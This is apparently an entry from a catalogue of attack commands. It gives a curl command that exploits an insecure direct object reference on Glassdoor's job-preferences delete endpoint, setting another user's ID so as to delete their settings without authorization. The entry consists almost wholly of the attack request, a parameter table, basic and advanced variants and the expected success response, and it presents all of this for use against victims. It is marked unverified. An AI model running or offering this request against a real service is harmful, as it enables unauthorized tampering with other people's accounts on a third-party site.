---
data: >-
  curl -X POST
  'https://www.glassdoor.com/member/profileApi/preferences/delete.htm' -H
  'Cookie: GDAT=session_token' -H 'Content-Type:
  application/x-www-form-urlencoded' -d
  'userId=TARGET_USER_ID&preferenceKey=jobLocation&action=delete'
tags:
  - web
  - api
  - exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:29.876Z'
id: b96314ee-f8ff-42b6-ac5a-19705e5b1a8d
verified: false
validated: true
submitted: true
---
# curl-modify-preferences

## Command

```bash
curl -X POST 'https://www.glassdoor.com/member/profileApi/preferences/delete.htm' -H 'Cookie: GDAT=session_token' -H 'Content-Type: application/x-www-form-urlencoded' -d 'userId=TARGET_USER_ID&preferenceKey=jobLocation&action=delete'
```

## Description

This command uses curl to send a POST request to Glassdoor's job preferences delete endpoint, exploiting IDOR by setting the 'userId' to a target victim's ID. It requires an authenticated session cookie and modifies the specified preference (e.g., job location) unauthorizedly. Use this in scenarios where direct object references are insecure.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the HTTP method | Yes |
| `https://www.glassdoor.com/member/profileApi/preferences/delete.htm` | Target endpoint URL | Yes |
| `-H 'Cookie: GDAT=session_token'` | Authenticated session header | Yes |
| `-H 'Content-Type: application/x-www-form-urlencoded'` | Sets payload format | Yes |
| `-d 'userId=TARGET_USER_ID&preferenceKey=jobLocation&action=delete'` | Payload with victim ID and preference details | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://www.glassdoor.com/member/profileApi/preferences/delete.htm' -H 'Cookie: GDAT=your_session' -d 'userId=12345678&action=delete'
```

### Advanced Usage

```bash
curl -X POST 'https://www.glassdoor.com/member/profileApi/preferences/delete.htm' -H 'Cookie: GDAT=your_session' -H 'User-Agent: Mozilla/5.0' -d 'userId=12345678&preferenceType=jobAlerts&value=null&action=delete' -v
```

## Expected Output

Successful execution returns HTTP 200 OK with a JSON response like {"status":"success","message":"Preference deleted"}. Failure due to invalid ID or auth shows 403 Forbidden or error message.

## Related

- [[Related Procedure: Exploit-IDOR-in-Glassdoor-Job-Preferences]]
